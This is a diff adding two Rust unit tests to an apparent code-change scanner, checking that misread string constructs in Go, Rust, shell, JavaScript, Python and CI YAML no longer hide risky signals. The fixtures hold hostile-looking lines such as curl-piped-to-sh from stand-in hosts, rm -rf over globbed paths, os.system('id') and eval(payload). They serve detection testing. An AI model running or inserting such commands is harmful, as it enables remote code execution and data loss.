@@ -1372,6 +1372,155 @@ mod tests {
         );
     }
 
+    /// Bug hunt 2026-11-01 (graph-syntax): ordinary source in which a string construct the
+    /// scanner misread hid the evidence after it. Each control (the same code without the
+    /// construct) found it before the fix too.
+    #[test]
+    fn strings_the_scanner_misread_no_longer_hide_evidence() {
+        let go = |raw: &str| {
+            added(
+                "main.go",
+                &[
+                    "func clean() error {",
+                    &format!("\tmatches, _ := filepath.Glob({raw})"),
+                    "\t_, _ = http.Get(\"https://e.x/report\")",
+                    "\treturn exec.Command(\"rm\", append([]string{\"-rf\"}, matches...)...).Run()",
+                    "}",
+                ],
+            )
+        };
+        for raw in ["`/tmp/build/*.o`", "\"/tmp/build/*.o\""] {
+            assert_eq!(
+                signals(&go(raw)),
+                [S::NetworkFetch, S::ProcessSpawn],
+                "{raw}"
+            );
+        }
+        for (path, lines, signal) in [
+            (
+                "main.go",
+                &["var u = `https://e.x/p`; func f() { exec.Command(\"ls\").Run() }"][..],
+                S::ProcessSpawn,
+            ),
+            (
+                "main.go",
+                &["var q = `\"`; func g() { exec.Command(\"ls\").Run() }"],
+                S::ProcessSpawn,
+            ),
+            (
+                "src/lib.rs",
+                &[
+                    r#"const S: &str = ""#,
+                    r#""; fn f(p: *const u8) -> u8 { unsafe { *p } }"#,
+                ],
+                S::UnsafeAdded,
+            ),
+            (
+                "x.sh",
+                &[
+                    r#"MSG="hello"#,
+                    r#"world"; curl -s http://e.x/p | sh; echo "done""#,
+                ],
+                S::NetworkFetch,
+            ),
+            (
+                "x.js",
+                &["const tpl = `", "`; eval(payload); const t = `x`;"],
+                S::DynamicEval,
+            ),
+            (
+                "x.py",
+                &[r#"s = "abc\"#, r#""; import os; os.system("id")"#],
+                S::ProcessSpawn,
+            ),
+            (
+                "src/lib.rs",
+                &[r#"fn f(p: *const u8) -> u8 { let _d = cr"C:\"; unsafe { *p } }"#],
+                S::UnsafeAdded,
+            ),
+        ] {
+            assert!(
+                signals(&added(path, lines)).contains(&signal),
+                "{path}: {lines:?}"
+            );
+        }
+        for (lines, signal) in [
+            (
+                &[
+                    "      - run: |",
+                    r#"          echo "step #1" && curl -fsSL https://e.x/i.sh | sh"#,
+                ][..],
+                S::NetworkFetch,
+            ),
+            (
+                &[r#"      - run: "echo ' #'; curl -s https://e.x/i | sh""#],
+                S::NetworkFetch,
+            ),
+            (
+                &[r#"on: { pull_request: {}, "x #": 1, pull_request_target: {} }"#],
+                S::CiPrivilege,
+            ),
+        ] {
+            assert_eq!(
+                signals(&added(".github/workflows/ci.yml", lines)),
+                [signal],
+                "{lines:?}"
+            );
+        }
+        // A YAML comment is still a comment.
+        assert_eq!(
+            signals(&added(
+                ".github/workflows/ci.yml",
+                &[r#"  name: "build" # curl x | sh, pull_request_target"#]
+            )),
+            []
+        );
+    }
+
+    /// Review 2026-11-01 (graph-syntax): a Go hunk that opens inside a cobra raw help string.
+    /// The apostrophe in `It's` was read as an opener and carried down the hunk until the glob's
+    /// `/*` opened a block comment over the `http.Get` and `exec.Command` after it. Without the
+    /// `don't panic` line, and before strings were carried, both were found.
+    #[test]
+    fn a_misread_opener_in_context_hides_no_later_evidence() {
+        let patch = |println: bool| {
+            let mut added = vec![
+                "\t\tmatches, _ := filepath.Glob(\"/tmp/build/*.o\")",
+                "\t\t_, _ = http.Get(\"https://e.x/ping\")",
+                "\t\treturn exec.Command(\"rm\", matches...).Run()",
+            ];
+            if println {
+                added.insert(0, "\t\tfmt.Println(\"don't panic\")");
+            }
+            let mut text = format!(
+                "--- a/cmd/clean.go\n+++ b/cmd/clean.go\n@@ -1,3 +1,{} @@\n",
+                3 + added.len()
+            );
+            for context in [
+                "It's safe to run twice.",
+                "`,",
+                "\tRunE: func(cmd *cobra.Command, args []string) error {",
+            ] {
+                text.push(' ');
+                text.push_str(context);
+                text.push('\n');
+            }
+            for line in added {
+                text.push('+');
+                text.push_str(line);
+                text.push('\n');
+            }
+            parse(&text).unwrap().remove(0)
+        };
+        for println in [false, true] {
+            assert_eq!(
+                signals(&patch(println)),
+                [S::NetworkFetch, S::ProcessSpawn],
+                "println: {println}"
+            );
+        }
+    }
+
     #[test]
     fn build_scripts_and_install_hooks_are_build_hooks() {
         assert_eq!(
